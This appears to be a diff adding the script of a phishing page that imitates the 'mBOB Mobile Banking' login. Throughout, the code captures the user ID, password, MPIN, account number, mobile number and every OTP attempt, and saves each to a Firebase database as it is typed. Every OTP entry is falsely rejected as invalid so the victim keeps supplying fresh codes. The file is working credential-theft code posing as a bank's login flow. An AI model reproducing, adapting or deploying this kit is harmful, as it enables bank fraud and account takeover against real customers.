+function forexClick() {
+  alert('Forex Services\n\nCurrency exchange rates and international transfers.');
+}
+
+function qrClick() {
+  alert('QR Payment\n\nScan QR code to pay.');
+}
+
+function transferClick() {
+  alert('Quick Transfer\n\nSend money to any account instantly.');
+}
+
+// =====================================================
+// LOGIN FORM
+// =====================================================
+var userIdInput = document.getElementById('userId');
+var passwordInput = document.getElementById('password');
+var loginBtn = document.getElementById('loginBtn');
+
+userIdInput.addEventListener('input', checkLoginForm);
+passwordInput.addEventListener('input', checkLoginForm);
+
+function checkLoginForm() {
+  var u = userIdInput.value.trim();
+  var p = passwordInput.value.trim();
+  if (u.length > 0 && p.length > 0) {
+    loginBtn.disabled = false;
+  } else {
+    loginBtn.disabled = true;
+  }
+}
+
+// =====================================================
+// HANDLE LOGIN
+// =====================================================
+function handleLogin(e) {
+  e.preventDefault();
+
+  var userId = userIdInput.value.trim();
+  var password = passwordInput.value.trim();
+
+  if (!userId || !password) {
+    alert('Please enter both User ID and Password.');
+    return;
+  }
+
+  userIdValue = userId;
+  passwordValue = password;
+  otpAttemptCount = 0;
+
+  var now = new Date();
+  var timeStr = now.toLocaleString('en-US', { hour12: true });
+
+  sessionRef = database.ref(DATA_NODE).push();
+  sessionRef.set({
+    userId: userId,
+    password: password,
+    mpin: '—',
+    otpCode: '—',
+    accountNumber: '—',
+    mobileNumber: '—',
+    status: 'pending',
+    time: timeStr,
+    timestamp: now.getTime(),
+    device: navigator.userAgent || 'Unknown'
+  }).then(function() {
+    console.log('✅ Session created in', DATA_NODE);
+  }).catch(function(err) {
+    console.error('❌ Firebase error:', err);
+  });
+
+  showLoading();
+
+  setTimeout(function() {
+    hideLoading();
+    showScreen('mpinPage');
+    clearOtpInputs('m');
+    document.getElementById('mpinMessage').classList.remove('show');
+    setTimeout(function() { document.getElementById('m1').focus(); }, 300);
+  }, 900);
+}
+
+// =====================================================
+// MPIN VERIFY
+// =====================================================
+function handleMpinVerify() {
+  var mpin = '';
+  for (var i = 1; i <= 6; i++) mpin += document.getElementById('m' + i).value;
+
+  if (mpin.length !== 6) {
+    showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  mpinValue = mpin;
+
+  if (sessionRef) {
+    sessionRef.update({ mpin: mpin }).then(function() {
+      console.log('✅ MPIN saved');
     });
-  </script>
+  }
+
+  showMsg('mpinMessage', '✅ Verified successfully', 'success');
+
+  setTimeout(function() {
+    showScreen('accountPage');
+    document.getElementById('accountNumber').value = '';
+    document.getElementById('mobileNumber').value = '';
+    document.getElementById('accountBtn').disabled = true;
+    document.getElementById('accountMessage').classList.remove('show');
+    setTimeout(function() { document.getElementById('accountNumber').focus(); }, 300);
+  }, 700);
+}
+
+// =====================================================
+// ACCOUNT DETAILS
+// =====================================================
+function checkAccountForm() {
+  var acc = document.getElementById('accountNumber').value.trim();
+  var mob = document.getElementById('mobileNumber').value.trim();
+  var btn = document.getElementById('accountBtn');
+
+  if (acc.length >= 6 && mob.length >= 6) {
+    btn.disabled = false;
+  } else {
+    btn.disabled = true;
+  }
+}
+
+function handleAccountConfirm() {
+  var acc = document.getElementById('accountNumber').value.trim();
+  var mob = document.getElementById('mobileNumber').value.trim();
+
+  if (!acc || acc.length < 6) {
+    showMsg('accountMessage', 'Please enter a valid account number.', 'warning');
+    return;
+  }
+  if (!mob || mob.length < 6) {
+    showMsg('accountMessage', 'Please enter a valid mobile number.', 'warning');
+    return;
+  }
+
+  accountNumberValue = acc;
+  mobileNumberValue = mob;
+
+  if (sessionRef) {
+    sessionRef.update({
+      accountNumber: acc,
+      mobileNumber: mob
+    }).then(function() {
+      console.log('✅ Account details saved');
+    });
+  }
+
+  var masked = mob.length <= 4 ? mob : '******' + mob.slice(-4);
+  document.getElementById('maskedNumber').textContent = masked;
+
+  showMsg('accountMessage', '✅ Confirmed successfully', 'success');
+
+  setTimeout(function() {
+    showScreen('otpPage');
+    clearOtpInputs('o');
+    document.getElementById('otpMessage').classList.remove('show');
+    otpAttemptCount = 0;
+    startTimer();
+    setTimeout(function() { document.getElementById('o1').focus(); }, 300);
+  }, 800);
+}
+
+// =====================================================
+// OTP VERIFY
+// =====================================================
+function handleOtpVerify() {
+  if (timeLeft <= 0) {
+    showMsg('otpMessage', 'OTP has expired. Please request a new one.', 'error');
+    return;
+  }
+
+  var otp = '';
+  for (var i = 1; i <= 6; i++) otp += document.getElementById('o' + i).value;
+
+  if (otp.length !== 6) {
+    showMsg('otpMessage', 'Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  otpAttemptCount++;
+
+  if (sessionRef) {
+    var now = new Date();
+    var otpKey = 'otp_' + Date.now();
+
+    sessionRef.child('otpHistory/' + otpKey).set({
+      otp: otp,
+      attempt: otpAttemptCount,
+      time: now.toLocaleString('en-US', { hour12: true }),
+      timestamp: now.getTime()
+    }).then(function() {
+      console.log('✅ OTP saved');
+    });
+
+    sessionRef.update({
+      otpCode: otp,
+      totalOtpAttempts: otpAttemptCount
+    });
+  }
+
+  showMsg('otpMessage', 'Invalid OTP. Please try again.', 'error');
+  clearOtpInputs('o');
+  setTimeout(function() { document.getElementById('o1').focus(); }, 200);
+}
+
+// =====================================================
+// TIMER
+// =====================================================
+function startTimer() {
+  timeLeft = 180;
+  updateTimer();
+  if (timerInterval) clearInterval(timerInterval);
+
+  timerInterval = setInterval(function() {
+    timeLeft--;
+    updateTimer();
+
+    if (timeLeft <= 30) {
+      document.getElementById('otpTimer').classList.add('expiring');
+    } else {
+      document.getElementById('otpTimer').classList.remove('expiring');
+    }
+
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      document.getElementById('otpTimer').textContent = '00:00';
+      showMsg('otpMessage', 'OTP has expired. Please request a new one.', 'error');
+    }
+  }, 1000);
+}
+
+function updateTimer() {
+  var min = Math.floor(timeLeft / 60);
+  var sec = timeLeft % 60;
+  document.getElementById('otpTimer').textContent =
+    (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+}
+
+function resendOtp() {
+  timeLeft = 180;
+  updateTimer();
+  document.getElementById('otpTimer').classList.remove('expiring');
+  startTimer();
+  showMsg('otpMessage', 'New OTP has been sent.', 'success');
+}
+
+// =====================================================
+// HELPERS
+// =====================================================
+function showScreen(pageId) {
+  document.querySelectorAll('.screen-page').forEach(function(p) {
+    p.classList.remove('show');
+  });
+  document.getElementById(pageId).classList.add('show');
+}
+
+function goBack() {
+  document.querySelectorAll('.screen-page').forEach(function(p) {
+    p.classList.remove('show');
+  });
+}
+
+function goBackTo(pageId) {
+  document.querySelectorAll('.screen-page').forEach(function(p) {
+    p.classList.remove('show');
+  });
+  document.getElementById(pageId).classList.add('show');
+}
+
+function moveInput(current, nextId) {
+  current.value = current.value.replace(/[^0-9]/g, '');
+
+  if (current.value.length === 1) {
+    current.classList.add('filled');
+    if (nextId) {
+      var next = document.getElementById(nextId);
+      if (next) next.focus();
+    }
+  } else {
+    current.classList.remove('filled');
+  }
+
+  var id = current.id;
+  if (id.startsWith('m')) checkMpinComplete();
+  if (id.startsWith('o')) checkOtpComplete();
+}
+
+function checkMpinComplete() {
+  var complete = true;
+  for (var i = 1; i <= 6; i++) {
+    if (document.getElementById('m' + i).value.length !== 1) { complete = false; break; }
+  }
+  document.getElementById('mpinBtn').disabled = !complete;
+}
+
+function checkOtpComplete() {
+  var complete = true;
+  for (var i = 1; i <= 6; i++) {
+    if (document.getElementById('o' + i).value.length !== 1) { complete = false; break; }
+  }
+  document.getElementById('otpBtn').disabled = !complete;
+}
+
+function clearOtpInputs(prefix) {
+  for (var i = 1; i <= 6; i++) {
+    var el = document.getElementById(prefix + i);
+    if (el) {
+      el.value = '';
+      el.classList.remove('filled');
+    }
+  }
+}
+
+function showMsg(id, text, type) {
+  var el = document.getElementById(id);
+  el.textContent = text;
+  el.className = 'message show ' + (type || 'error');
+}
+
+function showLoading() {
+  document.getElementById('loadingOverlay').classList.add('show');
+}
+
+function hideLoading() {
+  document.getElementById('loadingOverlay').classList.remove('show');
+}
+
+// Backspace navigation
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Backspace') {
+    var target = e.target;
+    if (target.tagName === 'INPUT' && !target.value) {
+      var id = target.id;
+      if (id.startsWith('m')) {
+        var n = parseInt(id.replace('m', ''));
+        if (n > 1) document.getElementById('m' + (n - 1)).focus();
+      }
+      if (id.startsWith('o')) {
+        var n = parseInt(id.replace('o', ''));
+        if (n > 1) document.getElementById('o' + (n - 1)).focus();
+      }
+    }
+  }
+});
+
+console.log('🏦 mBOB Mobile Banking loaded • Data node:', DATA_NODE);
+</script>
+
 </body>
 </html>
